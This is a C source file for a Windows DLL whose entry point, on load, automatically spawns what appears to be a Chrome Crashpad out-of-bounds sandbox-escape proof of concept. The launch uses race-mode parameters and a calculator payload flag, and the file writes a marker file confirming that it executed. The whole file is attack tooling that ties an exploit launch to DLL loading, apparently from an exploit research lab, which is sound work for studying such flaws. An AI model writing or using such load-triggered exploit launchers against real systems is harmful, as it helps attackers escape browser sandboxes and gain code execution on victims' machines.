#include <windows.h>
/* launchdll.c — 载入即拉起 78952 poc；db 路径按 PID 手工拼接（避开宽 printf 方言） */
static wchar_t* wcat(wchar_t* d, const wchar_t* s) { while (*s) *d++ = *s++; return d; }
static wchar_t* wnum(wchar_t* d, unsigned long v) {
  wchar_t t[12]; int n = 0;
  do { t[n++] = (wchar_t)(L"0"[0] + v % 10); v /= 10; } while (v);
  while (n) *d++ = t[--n];
  return d;
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
  (void)h; (void)r;
  if (reason == DLL_PROCESS_ATTACH) {
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    wchar_t db[80], cmd[900]; wchar_t* p = db;
    p = wcat(p, L"C:\\pwn\\pocdb_");
    p = wnum(p, GetCurrentProcessId()); *p = 0;
    CreateDirectoryW(db, NULL);
    memset(&si, 0, sizeof si); si.cb = sizeof si;
    p = wcat(cmd, L"C:\\pwn\\XBOW-CRASHPAD-ESCAPE\\poc\\crashpad_oob.exe --handler C:\\pwn\\chrome54\\chrome-win64\\chrome.exe --db ");
    p = wcat(p, db);
    p = wcat(p, L" --mode race --iters 8 --pages 41 --calc --dbg"); *p = 0;
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    HANDLE f = CreateFileW(L"C:\\pwn\\LAUNCH_DLL_LOADED.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(f, "dllmain-ok", 10, &w, NULL); CloseHandle(f); }
  }
  return TRUE;
}
